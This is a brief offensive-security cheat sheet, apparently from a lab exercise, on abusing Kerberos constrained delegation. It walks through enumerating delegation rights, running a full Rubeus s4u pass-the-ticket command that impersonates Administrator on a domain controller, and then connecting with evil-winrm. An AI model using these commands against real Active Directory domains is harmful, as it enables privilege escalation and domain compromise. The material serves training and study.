	Desc:
		Use ptt attacks and constrained delegations by SPN that use protocols and delegating a super user

	Usage:
	
		Enumerate who has DELEGATIONS property:
			powershell-sessionmsds-allowedtodelegateto  
		if we already compromised the service account who delegates, we can do a ptt attack.
		Hash the pass to NTLM if necessary
		Start with Rubeus ptt and s4u attack to generate a in memory  privlege escalated user delegation example:
			.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
			list the ticket with klist
		the example is requesting for http service on DC1 with a privileged user
		winrm uses http, therefore evil-winrm is possible
`